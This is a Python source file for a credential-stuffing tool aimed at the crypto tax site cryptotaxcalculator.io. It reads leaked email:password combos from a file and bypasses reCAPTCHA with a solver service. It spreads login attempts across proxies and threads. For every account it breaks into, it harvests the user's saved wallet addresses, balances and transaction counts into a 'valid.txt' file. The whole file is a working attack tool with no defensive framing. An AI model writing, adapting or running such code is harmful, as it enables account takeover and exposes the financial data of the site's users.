import aiohttp
import asyncio
import yaml
from typing import Dict, Any
from tabulate import tabulate
from aiohttp import ClientSession, ClientTimeout
from concurrent.futures import ThreadPoolExecutor

from solver import CaptchaSolver

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

class CryptoTaxLogin:
    def __init__(self, config: Dict[str, Any], session: ClientSession) -> None:
        self.config = config
        self.captcha_solver = CaptchaSolver(self.config.get('api_key'), session)
        self.session = session
        self.headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        }
        self.proxy = self.config.get('proxy')

    async def send_login_request(self, email: str, password: str) -> None:
        recaptcha_token = await self.captcha_solver.solve_captcha()

        url = 'https://api.cryptotaxcalculator.io/auth/login'
        data = {
            "email": email,
            "password": password,
            "captcha": recaptcha_token
        }

        async with self.session.post(url, json=data, headers=self.headers, proxy=self.proxy) as response:
            response_data = await response.json()

            if response_data.get("msg") == "Invalid email/password combination":
                print(f"{RED}[✖] Invalid login > {email}:{password}{RESET}")
                with open('invalid.txt', 'a') as file:
                    file.write(f'{email}:{password}\n')
            elif response_data.get("message") == "ok":
                print(f"{GREEN}[✔] Valid login > {email}:{password}{RESET}")
                await self.fetch_saved_accounts(email, password)
            else:
                print(f"{RED}[✖] Error {email}:{password}{RESET}")
                with open('error.txt', 'a') as file:
                    file.write(f'{email}:{password}\n {response_data}')

    async def fetch_saved_accounts(self, email: str, password: str) -> None:
        url = 'https://api.cryptotaxcalculator.io/imports/v2/saved-accounts-by-blockchain'
        
        async with self.session.get(url, headers=self.headers, proxy=self.proxy) as response:
            data = await response.json()
            
            if data.get("error"):
                print(f"{RED}[✖] Error fetching saved accounts > {email}:{password}{RESET}")
                with open('valid.txt', 'a') as file:
                    file.write(f'Error fetching account data but logged in - {email}:{password}\n')
            else:
                await self.parse_and_print_saved_accounts(data, email, password)

    async def parse_and_print_saved_accounts(self, data: Dict[str, Any], email: str, password: str) -> None:
        if 'data' in data:
            table_data = []
            for blockchain in data['data']:
                blockchain_name = blockchain.get('name', 'N/A')
                blockchain_value = blockchain.get('value', 'N/A')
                wallets = blockchain.get('wallets', [])

                addresses = [wallet.get('address', 'N/A') for wallet in wallets]
                tx_counts = [wallet.get('importedTxCount', 0) for wallet in wallets]
                wallet_names = [wallet.get('name', 'N/A') for wallet in wallets]

                addresses_str = ', '.join(addresses) if addresses else "None"
                tx_counts_str = ', '.join(map(str, tx_counts)) if tx_counts else "None"
                wallet_names_str = ', '.join(wallet_names) if wallet_names else "None"

                table_data.append([
                    blockchain_name,
                    blockchain_value,
                    wallet_names_str,
                    addresses_str,
                    tx_counts_str
                ])
            
            headers = ["Blockchain", "Total Balance", "Wallet Names", "Addresses", "Transactions Counts"]
            table_str = tabulate(table_data, headers=headers, tablefmt="grid")
            print(table_str)

            with open('valid.txt', 'a') as file:
                file.write(f'+{"-" * 50}+\nEmail: {email}\nPassword: {password}\n{table_str}\n+{"-" * 50}+\n')
        else:
            print("No data found")

async def process_login_task(config: Dict[str, Any], email: str, password: str) -> None:
    if len(password) < 8:
        print(f"{RED}[✖] Invalid login > {email}:{password}{RESET}")
        with open('invalid.txt', 'a') as file:
            file.write(f'{email}:{password}\n')
        return

    timeout = ClientTimeout(total=60)
    async with ClientSession(timeout=timeout) as session:
        crypto_tax_login = CryptoTaxLogin(config, session)
        await crypto_tax_login.send_login_request(email, password)

async def main():
    config_filename = 'config.yaml'
    
    with open(config_filename, 'r') as file:
        config = yaml.safe_load(file)
    
    num_threads = config.get('threads', 10)
    
    with open('combo.txt', 'r') as file:
        combos = [line.strip().split(':') for line in file.readlines() if line.strip()]
    
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        tasks = []
        for email, password in combos:
            task = loop.run_in_executor(executor, lambda e=email, p=password: asyncio.run(process_login_task(config, e, p)))
            tasks.append(task)
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
